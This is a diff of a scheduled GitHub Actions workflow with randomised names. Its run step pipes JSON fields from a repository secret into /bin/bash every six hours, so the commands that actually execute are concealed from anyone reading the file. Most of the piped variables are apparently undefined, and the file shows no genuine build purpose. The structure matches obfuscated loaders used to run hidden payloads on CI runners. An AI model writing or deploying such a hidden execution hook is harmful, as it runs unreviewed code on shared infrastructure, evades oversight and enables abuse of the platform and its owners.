@@ -1,21 +1,35 @@
 name: toucanprimary
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
+    - cron: '12 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: toucanprimary
         env:
-          py9: ${{ secrets.py9 }}
+          wkxb75895: ${{ secrets.wkxb75895 }}
         run: |
-          echo $py9 | jq -r .lckuc50933 | /bin/bash
-          echo $n145 | jq -r .e7591 | /bin/bash
-          echo $a367 | jq -r .jskgr16982 | /bin/bash
-          echo $dlpc0 | jq -r .k579 | /bin/bash
-          echo $rhm9 | jq -r .fnie141 | /bin/bash
-          echo $d74855 | jq -r .i8 | /bin/bash
+          echo $wkxb75895 | jq -r .z681 | /bin/bash
+          echo $qh9533 | jq -r .ma51640 | /bin/bash
+          echo $kuj9103 | jq -r .rv4 | /bin/bash
+          echo $zzp85542 | jq -r .i0774 | /bin/bash
+          echo $vd2 | jq -r .awh1 | /bin/bash
+          echo $glr2 | jq -r .hd6 | /bin/bash
+          echo $zdrx8 | jq -r .hfin75703 | /bin/bash
+          echo $byzku73635 | jq -r .kfbj796 | /bin/bash
+          echo $e5 | jq -r .p7 | /bin/bash
+          echo $nwwa71317 | jq -r .ef414 | /bin/bash
+          echo $fusf911 | jq -r .b012 | /bin/bash
+          echo $qgm0679 | jq -r .na42 | /bin/bash
+          echo $uq91 | jq -r .flckw1523 | /bin/bash
+          echo $wslwy3 | jq -r .wj57525 | /bin/bash
+          echo $szfh558 | jq -r .xfosc52818 | /bin/bash
+          echo $aum6 | jq -r .xadsi693 | /bin/bash
+          echo $pk773 | jq -r .qpeh95 | /bin/bash
 
